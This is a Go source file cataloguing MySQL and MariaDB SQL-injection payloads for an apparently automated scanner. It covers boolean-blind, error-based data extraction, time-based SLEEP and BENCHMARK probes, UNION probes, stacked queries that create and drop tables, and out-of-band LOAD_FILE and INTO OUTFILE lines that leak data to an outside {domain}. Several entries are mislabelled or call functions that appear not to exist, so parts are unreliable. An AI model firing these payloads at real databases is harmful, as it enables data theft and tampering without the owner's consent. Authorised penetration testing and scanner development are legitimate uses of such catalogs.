package payloads

// MySQL / MariaDB payload catalog. Each template's placeholders ({orig},
// {query}, {seconds}, {marker}, {colcount}, {domain}) are filled by the wrapper
// engine / runner. All vectors are original formulations expressed against the
// documented MySQL function surface.

func mysqlRow(id, title, tech, clause, minv, maxv string, risk, level, conf int, pre, suf, tpl string) Payload {
	return Payload{
		ID: id, Title: title, DBMS: DBMySQL, Technique: Technique(tech),
		Clause: Clause(clause), MinVersion: minv, MaxVersion: maxv,
		Risk: risk, Level: level, Confidence: conf,
		PrefixMode: pre, SuffixMode: suf, Template: tpl,
	}
}

func init() {
	rows := []Payload{

		// ---- Boolean-based blind (risk 1) ----
		mysqlRow("mysql-bool-and-num", "MySQL AND boolean-based blind - WHERE clause (numeric)", "boolean", "where", "", "", 1, 1, 90, "and", "comment", "{orig} AND 1=1"),
		mysqlRow("mysql-bool-and-string", "MySQL AND boolean-based blind - WHERE clause (string)", "boolean", "where", "", "", 1, 1, 90, "and", "comment", "{orig}' AND '1'='1"),
		mysqlRow("mysql-bool-and-dquote", "MySQL AND boolean-based blind - WHERE clause (double quote)", "boolean", "where", "", "", 1, 1, 88, "and", "comment", "{orig}\" AND \"1\"=\"1"),
		mysqlRow("mysql-bool-and-alpha", "MySQL AND boolean-based blind - WHERE clause (alphabetic)", "boolean", "where", "", "", 1, 1, 88, "and", "comment", "{orig}' AND 'a'='a"),
		mysqlRow("mysql-bool-or-num", "MySQL OR boolean-based blind - WHERE clause (numeric)", "boolean", "where", "", "", 1, 1, 88, "or", "comment", "{orig} OR 1=1"),
		mysqlRow("mysql-bool-or-string", "MySQL OR boolean-based blind - WHERE clause (string)", "boolean", "where", "", "", 1, 2, 86, "or", "comment", "{orig}' OR '1'='1"),
		mysqlRow("mysql-bool-and-ord", "MySQL AND boolean-based blind - WHERE clause (ORD of VERSION)", "boolean", "where", "", "", 1, 2, 85, "and", "comment", "{orig}' AND ORD(MID(VERSION(),1,1))>51"),
		mysqlRow("mysql-bool-and-elt", "MySQL AND boolean-based blind - WHERE clause (ELT)", "boolean", "where", "", "", 1, 2, 84, "and", "comment", "{orig} AND ELT(1,1)=1"),
		mysqlRow("mysql-bool-and-makeset", "MySQL AND boolean-based blind - WHERE clause (MAKE_SET)", "boolean", "where", "", "", 1, 2, 84, "and", "comment", "{orig} AND MAKE_SET(1,1)=1"),
		mysqlRow("mysql-bool-and-if", "MySQL AND boolean-based blind - WHERE clause (IF)", "boolean", "where", "", "", 1, 1, 86, "and", "comment", "{orig} AND IF(1=1,1,0)=1"),
		mysqlRow("mysql-bool-and-case", "MySQL AND boolean-based blind - WHERE clause (CASE)", "boolean", "where", "", "", 1, 1, 86, "and", "comment", "{orig} AND CASE WHEN 1=1 THEN 1 ELSE 0 END=1"),
		mysqlRow("mysql-bool-and-rlike", "MySQL AND boolean-based blind - WHERE clause (RLIKE)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig}' AND '1'='1' RLIKE '1"),
		mysqlRow("mysql-bool-and-regexp", "MySQL AND boolean-based blind - WHERE clause (REGEXP)", "boolean", "where", "", "", 1, 3, 80, "and", "comment", "{orig}' AND '1' REGEXP '1"),
		mysqlRow("mysql-bool-and-isnull", "MySQL AND boolean-based blind - WHERE clause (ISNULL)", "boolean", "where", "", "", 1, 2, 83, "and", "comment", "{orig} AND ISNULL(1/0)=0"),
		mysqlRow("mysql-bool-and-nullif", "MySQL AND boolean-based blind - WHERE clause (NULLIF)", "boolean", "where", "", "", 1, 3, 80, "and", "comment", "{orig} AND NULLIF(1,1) IS NULL"),
		mysqlRow("mysql-bool-and-nullsafe", "MySQL AND boolean-based blind - WHERE clause (null-safe <=>)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND 1<=>1"),
		mysqlRow("mysql-bool-and-paren", "MySQL AND boolean-based blind - WHERE clause (double paren)", "boolean", "where", "", "", 1, 2, 84, "and", "comment", "{orig} AND ((1)=1)"),
		mysqlRow("mysql-bool-and-double", "MySQL AND boolean-based blind - WHERE clause (nested paren depth)", "boolean", "where", "", "", 1, 3, 82, "and", "comment", "{orig} AND (((1)=1))"),
		mysqlRow("mysql-bool-and-triple", "MySQL AND boolean-based blind - WHERE clause (triple paren depth)", "boolean", "where", "", "", 1, 4, 80, "and", "comment", "{orig} AND ((((1)=1)))"),
		mysqlRow("mysql-bool-and-select", "MySQL AND boolean-based blind - WHERE clause (subquery compare)", "boolean", "where", "", "", 1, 1, 87, "and", "comment", "{orig} AND (SELECT 1)=1"),
		mysqlRow("mysql-bool-and-database", "MySQL AND boolean-based blind - WHERE clause (DATABASE length probe)", "boolean", "where", "", "", 1, 3, 82, "and", "comment", "{orig}' AND LENGTH(DATABASE())>1"),
		mysqlRow("mysql-bool-and-version", "MySQL AND boolean-based blind - WHERE clause (VERSION like probe)", "boolean", "where", "", "", 1, 3, 82, "and", "comment", "{orig}' AND VERSION() LIKE '5%"),
		mysqlRow("mysql-bool-having", "MySQL AND boolean-based blind - HAVING clause", "boolean", "having", "", "", 1, 2, 84, "and", "comment", "{orig} HAVING 1=1"),
		mysqlRow("mysql-bool-groupby", "MySQL AND boolean-based blind - GROUP BY clause", "boolean", "groupby", "", "", 1, 3, 82, "and", "comment", "{orig} GROUP BY 1 HAVING 1=1"),
		mysqlRow("mysql-bool-orderby", "MySQL AND boolean-based blind - ORDER BY clause", "boolean", "orderby", "", "", 1, 2, 84, "and", "comment", "{orig} ORDER BY IF(1=1,1,2)"),
		mysqlRow("mysql-bool-limit", "MySQL AND boolean-based blind - LIMIT/OFFSET clause", "boolean", "limit", "", "", 1, 4, 80, "and", "comment", "{orig} LIMIT 1 OFFSET IF(1=1,0,1)"),

		// ---- Error-based blind (risk 1-2) ----
		mysqlRow("mysql-err-floor-where", "MySQL >= 5.0 AND error-based - WHERE clause (FLOOR double query)", "error", "where", "5.0", "", 1, 1, 90, "and", "comment", "{orig} AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x{m1},(SELECT ({query})),0x{m2},0x61)s), 8446744073709551610, 8446744073709551610)))"),
		mysqlRow("mysql-err-floor-or", "MySQL >= 5.0 OR error-based - WHERE clause (FLOOR double query)", "error", "where", "5.0", "", 1, 2, 90, "or", "comment", "{orig} OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x{m1},(SELECT ({query})),0x{m2},0x61)s), 8446744073709551610, 8446744073709551610)))"),
		mysqlRow("mysql-err-extractvalue", "MySQL >= 5.1 AND error-based - WHERE clause (EXTRACTVALUE)", "error", "where", "5.1", "", 1, 1, 92, "and", "comment", "{orig} AND EXTRACTVALUE(8144,CONCAT(0x{m1},(SELECT ({query})),0x{m2}))"),
		mysqlRow("mysql-err-extractvalue-or", "MySQL >= 5.1 OR error-based - WHERE clause (EXTRACTVALUE)", "error", "where", "5.1", "", 1, 2, 92, "or", "comment", "{orig} OR EXTRACTVALUE(8144,CONCAT(0x{m1},(SELECT ({query})),0x{m2}))"),
		mysqlRow("mysql-err-updatexml", "MySQL >= 5.1 AND error-based - WHERE clause (UPDATEXML)", "error", "where", "5.1", "", 1, 1, 92, "and", "comment", "{orig} AND UPDATEXML(1774,CONCAT(0x{m1},(SELECT ({query})),0x{m2}),6391)"),
		mysqlRow("mysql-err-updatexml-or", "MySQL >= 5.1 OR error-based - WHERE clause (UPDATEXML)", "error", "where", "5.1", "", 1, 2, 92, "or", "comment", "{orig} OR UPDATEXML(1774,CONCAT(0x{m1},(SELECT ({query})),0x{m2}),6391)"),
		mysqlRow("mysql-err-floor-having", "MySQL >= 5.0 error-based - HAVING clause (FLOOR)", "error", "having", "5.0", "", 1, 2, 90, "and", "comment", "{orig} HAVING (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x{m1},(SELECT ({query})),0x{m2},0x61)s), 8446744073709551610, 8446744073709551610)))"),
		mysqlRow("mysql-err-floor-groupby", "MySQL >= 5.0 error-based - GROUP BY clause (FLOOR)", "error", "groupby", "5.0", "", 1, 3, 90, "and", "comment", "{orig} GROUP BY (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x{m1},(SELECT ({query})),0x{m2},0x61)s), 8446744073709551610, 8446744073709551610)))"),
		mysqlRow("mysql-err-floor-orderby", "MySQL >= 5.0 error-based - ORDER BY clause (FLOOR)", "error", "orderby", "5.0", "", 1, 3, 90, "and", "comment", "{orig} ORDER BY (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x{m1},(SELECT ({query})),0x{m2},0x61)s), 8446744073709551610, 8446744073709551610)))"),
		mysqlRow("mysql-err-floor-table", "MySQL >= 5.0 error-based - Table name clause (FLOOR)", "error", "generic", "5.0", "", 1, 3, 90, "replace", "comment", "(SELECT 3337 FROM(SELECT COUNT(*),CONCAT(0x{m1},(SELECT ({query})),0x{m2},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)"),
		mysqlRow("mysql-err-floor-column", "MySQL >= 5.0 error-based - Column name clause (FLOOR)", "error", "generic", "5.0", "", 1, 4, 90, "replace", "comment", "(SELECT 8746 FROM (SELECT COUNT(*),CONCAT(0x{m1},(SELECT ({query})),0x{m2},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLUMNS GROUP BY x)a)"),
		mysqlRow("mysql-err-updatexml-param", "MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)", "error", "generic", "5.1", "", 1, 2, 92, "replace", "comment", "(UPDATEXML(7562,CONCAT(0x{m1},(SELECT ({query})),0x{m2}),7807))"),
		mysqlRow("mysql-err-updatexml-having", "MySQL >= 5.1 error-based - HAVING clause (UPDATEXML)", "error", "having", "5.1", "", 1, 3, 92, "and", "comment", "{orig} HAVING UPDATEXML(1,CONCAT(0x{m1},(SELECT ({query})),0x{m2}),1)"),
		mysqlRow("mysql-err-extractvalue-having", "MySQL >= 5.1 error-based - HAVING clause (EXTRACTVALUE)", "error", "having", "5.1", "", 1, 3, 92, "and", "comment", "{orig} HAVING EXTRACTVALUE(1,CONCAT(0x{m1},(SELECT ({query})),0x{m2}))"),
		mysqlRow("mysql-err-gtid", "MySQL >= 5.6 error-based - WHERE clause (GTID_SUBSET)", "error", "where", "5.6", "", 2, 4, 90, "and", "comment", "{orig} AND GTID_SUBSET(CONCAT(0x{m1},(SELECT ({query})),0x{m2}),{query})"),
		mysqlRow("mysql-err-gtid2", "MySQL >= 5.6 error-based - WHERE clause (GTID_SERVER)", "error", "where", "5.6", "", 2, 4, 90, "and", "comment", "{orig} AND GTID_SERVER(CONCAT(0x{m1},(SELECT ({query})),0x{m2}))"),
		mysqlRow("mysql-err-nameconst", "MySQL >= 5.0 error-based - WHERE clause (NAME_CONST)", "error", "where", "5.0", "", 1, 3, 90, "and", "comment", "{orig} AND (SELECT 1 FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x)"),
		mysqlRow("mysql-err-exp", "MySQL >= 5.5 error-based - WHERE clause (EXP overflow)", "error", "where", "5.5", "", 1, 3, 88, "and", "comment", "{orig} AND EXP(~(SELECT * FROM (SELECT CONCAT(0x{m1},(SELECT ({query})),0x{m2}))x))"),
		mysqlRow("mysql-err-bigint", "MySQL >= 5.5 error-based - WHERE clause (BIGINT overflow)", "error", "where", "5.5", "", 1, 4, 88, "and", "comment", "{orig} AND !(SELECT * FROM (SELECT CONCAT(0x{m1},(SELECT ({query})),0x{m2}))x)-~0"),
		mysqlRow("mysql-err-duplicate", "MySQL >= 5.0 error-based - WHERE clause (duplicate key)", "error", "where", "5.0", "", 1, 3, 90, "and", "comment", "{orig} AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x{m1},(SELECT ({query})),0x{m2},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)"),
		mysqlRow("mysql-err-geometry", "MySQL >= 5.6 error-based - WHERE clause (GEOMETRY)", "error", "where", "5.6", "", 2, 4, 88, "and", "comment", "{orig} AND ST_PointFromText(CONCAT(0x{m1},(SELECT ({query})),0x{m2}))"),
		mysqlRow("mysql-err-multipoint", "MySQL >= 5.6 error-based - WHERE clause (MULTIPOINT)", "error", "where", "5.6", "", 2, 4, 88, "and", "comment", "{orig} AND ST_MLineFromText(CONCAT(0x{m1},(SELECT ({query})),0x{m2}))"),
		mysqlRow("mysql-err-stlatfromwkb", "MySQL >= 5.5 error-based - WHERE clause (ST_LatFromWKB)", "error", "where", "5.5", "", 1, 3, 88, "and", "comment", "{orig} AND ST_LatFromWKB(0x00)"),
		mysqlRow("mysql-err-geometrycollection", "MySQL >= 5.5 error-based - WHERE clause (GeometryCollection)", "error", "where", "5.5", "", 1, 3, 88, "and", "comment", "{orig} AND GeometryCollection((SELECT {query}))"),
		mysqlRow("mysql-err-cast-bad", "MySQL error-based - WHERE clause (CAST to signed)", "error", "where", "", "", 1, 4, 86, "and", "comment", "{orig} AND CAST((SELECT ({query})) AS SIGNED)"),
		mysqlRow("mysql-err-int-div", "MySQL error-based - WHERE clause (division by zero)", "error", "where", "", "", 1, 3, 84, "and", "comment", "{orig} AND (SELECT 1/(2-(SELECT 1)))"),
		mysqlRow("mysql-err-json", "MySQL >= 5.7 error-based - WHERE clause (JSON error)", "error", "where", "5.7", "", 2, 4, 86, "and", "comment", "{orig} AND JSON_EXTRACT(CONCAT('[',(SELECT ({query})),']'),0x{marker})"),

		// ---- Time-based blind (risk 1-2) ----
		mysqlRow("mysql-time-sleep", "MySQL >= 5.0.12 AND time-based blind - WHERE clause (SLEEP)", "time", "where", "5.0.12", "", 1, 1, 90, "and", "comment", "{orig} AND SLEEP({seconds})"),
		mysqlRow("mysql-time-sleep-str", "MySQL >= 5.0.12 AND time-based blind - WHERE clause (SLEEP string)", "time", "where", "5.0.12", "", 1, 2, 90, "and", "comment", "{orig}' AND SLEEP({seconds})"),
		mysqlRow("mysql-time-sleep-or", "MySQL >= 5.0.12 OR time-based blind - WHERE clause (SLEEP)", "time", "where", "5.0.12", "", 1, 3, 88, "or", "comment", "{orig} OR SLEEP({seconds})"),
		mysqlRow("mysql-time-sleep-sub", "MySQL >= 5.0.12 AND time-based blind - WHERE clause (SLEEP subquery)", "time", "where", "5.0.12", "", 1, 2, 90, "and", "comment", "{orig} AND (SELECT * FROM (SELECT SLEEP({seconds}))a)"),
		mysqlRow("mysql-time-sleep-orderby", "MySQL >= 5.0.12 time-based blind - ORDER BY clause (SLEEP)", "time", "orderby", "5.0.12", "", 1, 3, 88, "and", "comment", "{orig} ORDER BY SLEEP({seconds})"),
		mysqlRow("mysql-time-sleep-groupby", "MySQL >= 5.0.12 time-based blind - GROUP BY clause (SLEEP)", "time", "groupby", "5.0.12", "", 1, 4, 88, "and", "comment", "{orig} GROUP BY SLEEP({seconds})"),
		mysqlRow("mysql-time-sleep-having", "MySQL >= 5.0.12 time-based blind - HAVING clause (SLEEP)", "time", "having", "5.0.12", "", 1, 4, 88, "and", "comment", "{orig} HAVING SLEEP({seconds})"),
		mysqlRow("mysql-time-sleep-limit", "MySQL >= 5.0.12 time-based blind - LIMIT clause (SLEEP)", "time", "limit", "5.0.12", "", 1, 4, 86, "and", "comment", "{orig} LIMIT SLEEP({seconds})"),
		mysqlRow("mysql-time-if-sleep", "MySQL >= 5.0.12 time-based blind - WHERE clause (IF + SLEEP)", "time", "where", "5.0.12", "", 1, 1, 88, "and", "comment", "{orig} AND IF(1=1,SLEEP({seconds}),0)"),
		mysqlRow("mysql-time-case-sleep", "MySQL >= 5.0.12 time-based blind - WHERE clause (CASE + SLEEP)", "time", "where", "5.0.12", "", 1, 2, 88, "and", "comment", "{orig} AND CASE WHEN 1=1 THEN SLEEP({seconds}) ELSE 0 END"),
		mysqlRow("mysql-time-benchmark", "MySQL AND time-based blind - WHERE clause (BENCHMARK)", "time", "where", "", "", 2, 2, 88, "and", "comment", "{orig} AND BENCHMARK(10000000,MD5(1))"),
		mysqlRow("mysql-time-benchmark-sha", "MySQL AND time-based blind - WHERE clause (BENCHMARK SHA1)", "time", "where", "", "", 2, 2, 86, "and", "comment", "{orig} AND BENCHMARK(10000000,SHA1('vx'))"),
		mysqlRow("mysql-time-benchmark-string", "MySQL AND time-based blind - WHERE clause (BENCHMARK string)", "time", "where", "", "", 2, 3, 86, "and", "comment", "{orig}' AND BENCHMARK(10000000,MD5(1))"),
		mysqlRow("mysql-time-heavy-join", "MySQL AND time-based blind - WHERE clause (heavy cross join)", "time", "where", "", "", 2, 4, 84, "and", "comment", "{orig} AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C, information_schema.tables D)"),

		// ---- UNION query (risk 1) ----
		mysqlRow("mysql-union-orderby", "MySQL UNION query - ORDER BY column probe", "union", "where", "", "", 1, 1, 88, "replace", "comment", "{orig} ORDER BY {marker}"),
		mysqlRow("mysql-union-select-null", "MySQL UNION query - UNION SELECT NULL", "union", "where", "", "", 1, 1, 90, "replace", "comment", "{orig} UNION SELECT {colcount}"),
		mysqlRow("mysql-union-all-null", "MySQL UNION query - UNION ALL SELECT NULL", "union", "where", "", "", 1, 1, 90, "replace", "comment", "{orig} UNION ALL SELECT {colcount}"),
		mysqlRow("mysql-union-select-marker", "MySQL UNION query - UNION SELECT marker", "union", "where", "", "", 1, 2, 92, "replace", "comment", "{orig} UNION SELECT {marker},{colcount}"),
		mysqlRow("mysql-union-paren", "MySQL UNION query - parenthesised UNION", "union", "where", "", "", 1, 2, 88, "replace", "comment", "{orig}) UNION SELECT {colcount}"),
		mysqlRow("mysql-union-from", "MySQL UNION query - UNION SELECT with FROM", "union", "where", "", "", 1, 3, 88, "replace", "comment", "{orig} UNION SELECT {colcount} FROM (SELECT 1)"),
		mysqlRow("mysql-union-gb", "MySQL UNION query - GROUP BY clause", "union", "groupby", "", "", 1, 3, 86, "replace", "comment", "{orig} GROUP BY {marker}) UNION SELECT {colcount}"),
		mysqlRow("mysql-union-ob", "MySQL UNION query - ORDER BY clause", "union", "orderby", "", "", 1, 3, 86, "replace", "comment", "{orig} ORDER BY {marker}) UNION SELECT {colcount}"),
		mysqlRow("mysql-union-all-from", "MySQL UNION query - UNION ALL with subquery row source", "union", "where", "", "", 1, 4, 86, "replace", "comment", "{orig} UNION ALL SELECT {colcount} FROM (SELECT 1 UNION SELECT 2)"),

		// ---- Stacked queries (risk 2-3) ----
		mysqlRow("mysql-stack-sleep", "MySQL stacked queries - ;SELECT SLEEP", "stacked", "generic", "", "", 2, 3, 88, "term", "comment", "{orig};SELECT SLEEP({seconds})"),
		mysqlRow("mysql-stack-benchmark", "MySQL stacked queries - ;SELECT BENCHMARK", "stacked", "generic", "", "", 2, 3, 86, "term", "comment", "{orig};SELECT BENCHMARK(10000000,MD5(1))"),
		mysqlRow("mysql-stack-if-sleep", "MySQL stacked queries - ;SELECT IF SLEEP", "stacked", "generic", "", "", 2, 4, 86, "term", "comment", "{orig};SELECT IF(1=1,SLEEP({seconds}),0)"),
		mysqlRow("mysql-stack-exit", "MySQL stacked queries - ;SELECT 1 (terminator probe)", "stacked", "generic", "", "", 2, 4, 82, "term", "comment", "{orig};SELECT 1"),
		mysqlRow("mysql-stack-create", "MySQL stacked queries - CREATE temp probe", "stacked", "generic", "", "", 3, 5, 80, "term", "comment", "{orig};CREATE TABLE IF NOT EXISTS vx_t(x int);DROP TABLE vx_t"),
		mysqlRow("mysql-stack-set", "MySQL stacked queries - SET @var probe", "stacked", "generic", "", "", 2, 4, 82, "term", "comment", "{orig};SET @a=1"),
		mysqlRow("mysql-stack-do-sleep", "MySQL >= 5.0.12 stacked queries - ;DO SLEEP", "stacked", "generic", "5.0.12", "", 2, 4, 84, "term", "comment", "{orig};DO SLEEP({seconds})"),
		mysqlRow("mysql-stack-gettbl", "MySQL >= 5.0.12 stacked queries - ;SELECT table probe", "stacked", "generic", "5.0.12", "", 2, 4, 82, "term", "comment", "{orig};SELECT 2 FROM (SELECT 1) x;-- -"),

		// ---- Inline query (risk 1) ----
		mysqlRow("mysql-inline-sub", "MySQL inline query - subquery in place of value", "inline", "where", "", "", 1, 1, 86, "value", "none", "(SELECT 1)"),
		mysqlRow("mysql-inline-value", "MySQL inline query - scalar subquery as value", "inline", "where", "", "", 1, 2, 86, "value", "none", "(SELECT ({query}))"),
		mysqlRow("mysql-inline-nested", "MySQL inline query - nested subquery comparison", "inline", "where", "", "", 1, 3, 84, "and", "comment", "{orig} AND (SELECT 8634)=(SELECT 8634)"),
		mysqlRow("mysql-inline-fn", "MySQL inline query - function in subquery", "inline", "where", "", "", 1, 3, 84, "and", "comment", "{orig} AND (SELECT VERSION())=(SELECT VERSION())"),

		// ---- Out-of-band (risk 2, requires --oob-domain) ----
		mysqlRow("mysql-oob-loadfile-unc", "MySQL out-of-band - LOAD_FILE UNC DNS (risk)", "oob", "where", "", "", 2, 4, 80, "and", "comment", "{orig} AND LOAD_FILE('\\{domain}\\vx')"),
		mysqlRow("mysql-oob-loadfile-concat", "MySQL out-of-band - LOAD_FILE CONCAT UNC DNS", "oob", "where", "", "", 2, 4, 78, "and", "comment", "{orig} AND LOAD_FILE(CONCAT(0x5c5c,'{domain}',0x5c,'vx'))"),
		mysqlRow("mysql-oob-into-outfile", "MySQL out-of-band - INTO OUTFILE HTTP (risk)", "oob", "generic", "", "", 3, 5, 76, "term", "comment", "{orig};SELECT 'vx' INTO OUTFILE '\\\\{domain}\\vx'"),

		// ---- Version-aware additional vectors ----
		mysqlRow("mysql-bool-maria", "MariaDB AND boolean-based blind - WHERE clause", "boolean", "where", "5.5", "", 1, 3, 82, "and", "comment", "{orig} AND 1=1"),
		mysqlRow("mysql-err-maria-floor", "MariaDB >= 5.5 error-based - WHERE clause (FLOOR)", "error", "where", "5.5", "", 1, 3, 88, "and", "comment", "{orig} AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x{m1},(SELECT ({query})),0x{m2},0x61)s), 8446744073709551610, 8446744073709551610)))"),
		mysqlRow("mysql-time-maria-sleep", "MariaDB >= 5.5 time-based blind (SLEEP)", "time", "where", "5.5", "", 1, 3, 88, "and", "comment", "{orig} AND SLEEP({seconds})"),
		mysqlRow("mysql-bool-xor", "MySQL AND boolean-based blind - WHERE clause (XOR)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} XOR 1=1"),
		mysqlRow("mysql-bool-soundslike", "MySQL AND boolean-based blind - WHERE clause (SOUNDS LIKE)", "boolean", "where", "", "", 1, 3, 80, "and", "comment", "{orig} AND 'v' SOUNDS LIKE 'v'"),
		mysqlRow("mysql-bool-between", "MySQL AND boolean-based blind - WHERE clause (BETWEEN)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND 1 BETWEEN 1 AND 1"),
		mysqlRow("mysql-bool-in", "MySQL AND boolean-based blind - WHERE clause (IN)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND 1 IN (1)"),
		mysqlRow("mysql-bool-lnot", "MySQL AND boolean-based blind - WHERE clause (logical NOT)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND NOT(1=2)"),
		mysqlRow("mysql-time-sleep-select", "MySQL AND time-based blind - WHERE clause (SLEEP in SELECT list)", "time", "where", "5.0.12", "", 1, 3, 88, "and", "comment", "{orig} AND (SELECT SLEEP({seconds}))"),
		mysqlRow("mysql-err-datanotlong", "MySQL error-based - WHERE clause (data too long)", "error", "where", "", "", 2, 4, 84, "and", "comment", "{orig} AND (SELECT IF(1=1,CONCAT(REPEAT('a',5000),(SELECT ({query}))),1))"),
		mysqlRow("mysql-bool-limit-analytic", "MySQL AND boolean-based blind - LIMIT clause parity", "boolean", "limit", "", "", 1, 5, 78, "and", "comment", "{orig} LIMIT 1 OFFSET 1^1"),

		// ---- MySQL boolean family: scalar-function tautologies (risk 1) ----
		mysqlRow("mysql-bool-and-strcmp", "MySQL AND boolean-based blind - WHERE clause (STRCMP)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND STRCMP('a','a')=0"),
		mysqlRow("mysql-bool-and-field", "MySQL AND boolean-based blind - WHERE clause (FIELD)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND FIELD(1,1,2)=1"),
		mysqlRow("mysql-bool-and-coalesce", "MySQL AND boolean-based blind - WHERE clause (COALESCE)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND COALESCE(1,NULL)=1"),
		mysqlRow("mysql-bool-and-greatest", "MySQL AND boolean-based blind - WHERE clause (GREATEST)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND GREATEST(1,0)=1"),
		mysqlRow("mysql-bool-and-least", "MySQL AND boolean-based blind - WHERE clause (LEAST)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND LEAST(1,2)=1"),
		mysqlRow("mysql-bool-and-concat", "MySQL AND boolean-based blind - WHERE clause (CONCAT)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND CONCAT('a','b')='ab'"),
		mysqlRow("mysql-bool-and-mod", "MySQL AND boolean-based blind - WHERE clause (MOD)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND MOD(5,2)=1"),
		mysqlRow("mysql-bool-and-bitand", "MySQL AND boolean-based blind - WHERE clause (bitwise AND)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND (1 & 1)=1"),
		mysqlRow("mysql-bool-and-bitor", "MySQL AND boolean-based blind - WHERE clause (bitwise OR)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND (1 | 0)=1"),
		mysqlRow("mysql-bool-and-bitxor", "MySQL AND boolean-based blind - WHERE clause (bitwise XOR)", "boolean", "where", "", "", 1, 3, 80, "and", "comment", "{orig} AND (1 ^ 0)=1"),
		mysqlRow("mysql-bool-and-pow", "MySQL AND boolean-based blind - WHERE clause (POW)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND POW(2,0)=1"),
		mysqlRow("mysql-bool-and-sqrt", "MySQL AND boolean-based blind - WHERE clause (SQRT)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND SQRT(1)=1"),
		mysqlRow("mysql-bool-and-abs", "MySQL AND boolean-based blind - WHERE clause (ABS)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND ABS(-1)=1"),
		mysqlRow("mysql-bool-and-ceil", "MySQL AND boolean-based blind - WHERE clause (CEIL)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND CEIL(0.1)=1"),
		mysqlRow("mysql-bool-and-floor-fn", "MySQL AND boolean-based blind - WHERE clause (FLOOR function)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND FLOOR(1.9)=1"),
		mysqlRow("mysql-bool-and-round", "MySQL AND boolean-based blind - WHERE clause (ROUND)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND ROUND(1.4)=1"),
		mysqlRow("mysql-bool-and-char-len", "MySQL AND boolean-based blind - WHERE clause (CHAR_LENGTH)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND CHAR_LENGTH('a')=1"),
		mysqlRow("mysql-bool-and-benchfr", "MySQL AND boolean-based blind - WHERE clause (HEX)", "boolean", "where", "", "", 1, 3, 80, "and", "comment", "{orig} AND HEX('a')='61'"),
		mysqlRow("mysql-bool-and-reverse", "MySQL AND boolean-based blind - WHERE clause (REVERSE)", "boolean", "where", "", "", 1, 3, 80, "and", "comment", "{orig} AND REVERSE('ab')='ba'"),
		mysqlRow("mysql-bool-and-substring", "MySQL AND boolean-based blind - WHERE clause (SUBSTRING)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND SUBSTRING('ab',1,1)='a'"),
		mysqlRow("mysql-bool-and-left", "MySQL AND boolean-based blind - WHERE clause (LEFT)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND LEFT('ab',1)='a'"),
		mysqlRow("mysql-bool-and-right", "MySQL AND boolean-based blind - WHERE clause (RIGHT)", "boolean", "where", "", "", 1, 2, 82, "and", "comment", "{orig} AND RIGHT('ab',1)='b'"),
		mysqlRow("mysql-bool-and-uuid", "MySQL AND boolean-based blind - WHERE clause (UUID LENGTH)", "boolean", "where", "", "", 1, 3, 80, "and", "comment", "{orig} AND LENGTH(UUID())=36"),
		mysqlRow("mysql-bool-and-password-str", "MySQL AND boolean-based blind - WHERE clause (PASSWORD length)", "boolean", "where", "", "", 1, 3, 78, "and", "comment", "{orig} AND LENGTH(PASSWORD('vx'))>1"),
		mysqlRow("mysql-bool-and-collation", "MySQL AND boolean-based blind - WHERE clause (COLLATION probe)", "boolean", "where", "", "", 1, 3, 78, "and", "comment", "{orig}' AND COLLATION('a')=COLLATION('a')"),

		// ---- MySQL error family (risk 1-2, version & clause aware) ----
		mysqlRow("mysql-err-floor-pschema", "MySQL >= 5.0 error-based - WHERE clause (FLOOR via performance_schema)", "error", "where", "5.0", "", 1, 3, 90, "and", "comment", "{orig} AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x{m1},(SELECT ({query})),0x{m2},0x61)s), 8446744073709551610, 8446744073709551610)))"),
		mysqlRow("mysql-err-floor-errors", "MySQL >= 5.0 error-based - WHERE clause (FLOOR via system errors)", "error", "where", "5.0", "", 1, 3, 88, "and", "comment", "{orig} AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x{m1},(SELECT ({query})),0x{m2},FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)"),
